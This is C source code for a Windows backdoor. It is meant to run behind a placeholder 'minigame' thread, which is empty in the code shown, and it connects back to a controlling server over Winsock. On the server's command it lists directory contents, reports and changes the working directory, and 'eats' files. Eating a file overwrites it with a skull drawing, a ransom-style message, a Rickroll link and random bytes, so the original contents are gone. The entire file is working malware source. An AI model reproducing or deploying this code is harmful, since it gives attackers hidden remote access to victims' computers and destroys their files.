#include<stdio.h>
#include<winsock2.h>
#include<string.h>
#include <dirent.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>

#pragma comment(lib,"ws2_32.lib")


// Declaring needed variables globally
WSADATA wsa;
SOCKET s;
struct sockaddr_in server;
char buffer[2048];
int recv_size;
int awaamiErrorCode;

// Repetitive code declared as functions here...

// Called when any error is caught, to stop the program then and there
void error() {
	exit(1);
}

// Iniitialize Winsock
void initWinSock() {
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		fprintf(stderr, "\nFailed. Error Code : %d",WSAGetLastError());
		error();
	}
	
}

// Create socket
void createPrepSock() {

	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		fprintf(stderr, "\nCould not create socket : %d" , WSAGetLastError());
		error();
	}
}

// Connect to the hacker/server's computer
int makeConnToServer() {

	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(8888);
	
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		return 0;
	}

	return 1;
}

// Recieve data and put it in buffer
int reliableRecieve() {

	// Cleaning buffer before data comes.
	memset(buffer,0,strlen(buffer));

	if ((recv_size = recv(s, buffer, sizeof(buffer), 0)) == SOCKET_ERROR) {
		return -1;
	}

	buffer[recv_size] = '\0';
	if (recv_size == 1) return 0;

	return 1;
}

// Send all data stored in buffer
void reliableSend() {
	//Sending message to client
	send(s , buffer , strlen(buffer) , 0);
}

// Load the buffer with list of current folder contents
void pullDirectoryData()
    {
        // Code to extract directory data
        DIR *directory;
        struct dirent *entry;

        // Open the current working directory
        directory = opendir(".");
        if (directory == NULL)
        {
            perror("Error opening current working directory");
        }

        // Loop through the entries in the directory
        while ((entry = readdir(directory)) != NULL)
        {
            char filename[100];
            char filetype[10];

            if((entry->d_type + '0') == '0') {
                strcpy(filetype, "FILE");
            } else {
                strcpy(filetype, "FOLDER");
            }

            strcpy(filename, entry->d_name);
            strcat(filename, "\n");
            strcat(filename, filetype);
            strcat(filename, "\n\n");
            strcat(buffer, filename);
        }

        // Close the directory
        closedir(directory);
}

// Load the buffer with CWD Path
void loadCWD() {
	getcwd(buffer, sizeof(buffer));
}

// Load the buffer with any data
void writeToBuffer(char data[]) {
	// Clearing old data
	memset(buffer,0,strlen(buffer));

	// Putting new data
	strcpy(buffer, data);
}

// Function that eats any file
int eatFile(char fileName[]) {
    int offset, n;
    FILE *filein;

    srand(time(NULL));

    filein = fopen(fileName, "r");

    if (filein == NULL) {
        return 0;
    }

    fseek(filein, 0L, SEEK_END);
    n = ftell(filein);

    fclose(filein);

    filein = fopen(fileName, "w");

	
	fputs("         _______________\n", filein);
	fputs("        /               \\\n", filein);
	fputs("       /                 \\\n", filein);
	fputs("      /                   \\\n", filein);
	fputs("      |   XXXX     XXXX   |\n", filein);
	fputs("      |   XXXX     XXXX   |\n", filein);
	fputs("      |   XXX       XXX   |\n", filein);
	fputs("      |         X         |\n", filein);
	fputs("      \\__      XXX     __/\n", filein);
	fputs("        |\\     XXX     /|\n", filein);
	fputs("        | |           | |\n", filein);
	fputs("        | I I I I I I I |\n", filein);
	fputs("        |  I I I I I I  |\n", filein);
	fputs("         \\_           _/\n", filein);
	fputs("          \\_         _/\n", filein);
	fputs("            \\_______/\n", filein);
	fputs("  XXX                        XXX\n", filein);
	fputs("XXXXX                        XXXXX\n", filein);
	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
	fputs("         XXXXX     XXXXX\n", filein);
	fputs("             XXXXXXX\n", filein);
	fputs("         XXXXX     XXXXX\n", filein);
	fputs(" XXXXXXXXXX             XXXXXXXXXX\n", filein);
	fputs("XXXXX                        XXXXX\n", filein);
	fputs("  XXX                        XXX\n\n", filein);


	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n", filein);
	fputs("			I OWN YOUR FILE.\n			WATCH THE VIDEO TO GET IT BACK.\n", filein);
	fputs("=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/=/\n\n", filein);
	fputs("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n\n", filein);

    for (int i = 0; i < n; i++) {
        fputc(rand() % 256, filein);
    }

    fclose(filein);

    return 1;
}

// Main function for backdoor operations
int backdoor_main()
{
	// Main Code 

	initWinSock();

	// A continious connection persistant loop for the backdoor
	int connected = 0;

	while (1) {

		while (!connected) {
			Sleep(1000);
			fprintf(stderr, "\r[+] Trying to connect...");
			createPrepSock();
			connected = makeConnToServer(); // returns 1 if successful
		}

		fprintf(stderr, "\n\n[+] Connected\n");
		
		while (connected) {
			
			// Getting chosen option by server
			while (1) {
				awaamiErrorCode = reliableRecieve();
				if (awaamiErrorCode != 0) break;
			}

			// Checking if connection is still intact.
			if (awaamiErrorCode == 1)
			{
				// Checking option selected by server
				int option = atoi(buffer);

				switch (option) {
					case 1:
						fprintf(stderr, "\n[+] Pulling file list data...");
						pullDirectoryData();

						fprintf(stderr, "\n[+] Sending file list data.");
						reliableSend();

						break;

					
					case 2:
						fprintf(stderr, "\n[+] Getting cwd...");
						loadCWD();

						fprintf(stderr, "\n[+] Sending data.");
						reliableSend();

						break;


					case 3:
						fprintf(stderr, "\n[+] Getting directory name from server...");
						
						awaamiErrorCode = 0;
						while (awaamiErrorCode == 0) {
							awaamiErrorCode = reliableRecieve();
						}

						chdir(buffer);

						// Sending updated CWD
						loadCWD();
						fprintf(stderr, "\n[+] Sending updated CWD.");
						reliableSend();

						break;


					case 4:
						fprintf(stderr, "\n[+] Changing to parent directory...");
						chdir("..");

						// Sending updated CWD
						loadCWD();
						fprintf(stderr, "\n[+] Sending updated CWD.");
						reliableSend();

						break;

					case 5:
						fprintf(stderr, "\n[+] Getting file name from server...");
						
						awaamiErrorCode = 0;
						while (awaamiErrorCode == 0) {
							awaamiErrorCode = reliableRecieve();
						}

						awaamiErrorCode = eatFile(buffer);

						// Sending post eating report
						fprintf(stderr, "\n[+] Sending post eating report.");
						if (awaamiErrorCode == 1) {
							writeToBuffer("File eaten successfully.");
						} else {
							writeToBuffer("File was not eaten, probably not found.");
						}

						reliableSend();

						break;
					
					default:
						printf("\n[+] Invalid Option Recieved.");
						break;
				}
			}

			// if connection was broken
			else {
				connected = 0;
				break;
			}
		}
		
		fprintf(stderr, "\n\n[+] Disconnected...\n\n");
	}

	return 0;
}


// Runs the main code for the backdoor operations.
void *thread1() {
	backdoor_main();
}

// Runs the minigame in the foreground
void *thread2() {
	// while(1) {
	// 	fprintf(stderr, "Hello Jee, I'm also here!\n");
	// 	Sleep(1000);
	// }
}

int main(int argc , char *argv[]) {

	// The main function here executes two different functions in parallel,
	// namely thread1 and thread2.

	pthread_t threadId1;
	pthread_t threadId2;

	pthread_create(&threadId1, NULL, &thread1, NULL);
	pthread_create(&threadId2, NULL, &thread2, NULL);

	pthread_join(threadId1, NULL);
	pthread_join(threadId2, NULL);
}
